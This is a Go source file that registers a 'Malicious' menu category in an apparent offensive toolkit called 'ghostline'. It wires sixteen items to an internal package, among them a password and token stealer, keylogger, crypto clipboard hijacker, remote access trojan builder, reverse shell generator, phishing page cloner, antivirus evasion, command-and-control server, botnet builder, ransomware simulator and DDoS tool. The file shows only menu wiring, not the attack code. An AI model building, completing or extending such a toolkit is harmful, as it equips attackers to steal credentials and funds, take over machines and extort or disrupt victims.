package cmd

import (
    "ghostline/internal/malicious"
    "ghostline/internal/ui"
)

func init() {
    ui.RegisterCategory(ui.Category{
        Name: "Malicious",
        Items: []ui.Item{
            {"Email Bomber", "send spam emails to target", malicious.EmailBomber},
            {"Crypto Clipper", "clipboard hijacking for wallets", malicious.CryptoClipper},
            {"Vuln Scanner", "scan targets for common vulns", malicious.VulnScanner},
            {"Stress Tester", "high traffic network stress test", malicious.DDoS},
            {"Stealer", "compile password and token stealer", malicious.Stealer},
            {"Keylogger", "build stealth keystroke logger", malicious.Keylogger},
            {"IP Grabber", "generate tracking links for IPs", malicious.IPGrabber},
            {"RAT Builder", "build remote access trojan stubs", malicious.RATBuilder},
            {"Wallet Cracker", "bruteforce mnemonic phrases", malicious.WalletBrute},
            {"Reverse Shell", "generate reverse shell payloads", malicious.ReverseShell},
            {"Phishing Page", "clone login pages for creds", malicious.PhishingPage},
            {"Persistence", "install persistence on target", malicious.Persistence},
            {"AV Evasion", "obfuscate payloads to bypass AV", malicious.AVEvasion},
            {"C2 Server", "spin up a command and control", malicious.C2Server},
            {"Botnet Builder", "build a small botnet controller", malicious.Botnet},
            {"Ransomware Sim", "simulate ransomware encryption", malicious.RansomSim},
        },
    })
}